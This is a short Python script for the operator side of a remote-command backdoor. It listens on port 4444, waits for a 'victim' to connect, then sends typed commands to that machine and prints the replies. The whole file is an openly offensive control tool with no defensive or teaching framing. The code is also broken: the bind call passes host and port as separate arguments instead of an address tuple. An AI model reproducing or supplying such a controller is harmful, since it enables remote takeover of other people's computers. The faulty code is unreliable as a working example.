import socket


def main():
    host = 'localhost'
    port = 4444
    soc = socket.socket()
    soc.bind(host, port)
    soc.listen(1)
    print("Wait victim...")
    connection, address = soc.accept()
    print("Sucsessfull connection" + str(address))

    while True:
        try:
            to_send = input("SendCommand -> ")
            connection.send(to_send.encode())
            data = connection.recv(1024).decode()
            print(data)
        except Exception:
            break

    print("Connection refused")
    connection.close()


if __name__ == "__main__":
    main()    
